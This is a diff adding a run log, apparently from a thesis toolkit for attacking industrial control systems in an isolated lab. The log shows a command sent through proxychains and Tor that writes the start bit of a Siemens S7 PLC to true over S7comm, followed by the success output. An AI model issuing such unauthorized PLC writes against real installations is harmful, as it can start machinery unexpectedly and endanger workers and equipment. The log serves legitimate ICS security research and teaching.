@@ -1,0 +1,20 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  Siemens S7 - Escritura de bit Marcha (DB1.DBX4.0, BOOL)
+======================================================================
+  Fecha      : 2026-10-09 22:10:47
+  Objetivo   : 192.168.30.10 -> true
+  MITRE ICS  : T0855
+======================================================================
+$ proxychains python3 -m modules._cli.s7_cli write_marcha --target 192.168.30.10 --rack 0 --slot 1 --valor true
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.30.10:102  ...  OK
+[+] Conectado correctamente al PLC S7 en 192.168.30.10
+[*] Modificando bit de Marcha a True en DB1.DBX4.0...
+  [OK] Estado de Marcha actualizado a True.
+  [*] Marcha      (DB1.DBX4.0): True
+  [*] Parada Emerg(DB1.DBX4.1): False
+[+] Sesión S7comm finalizada.
+[=] Código de salida: 0
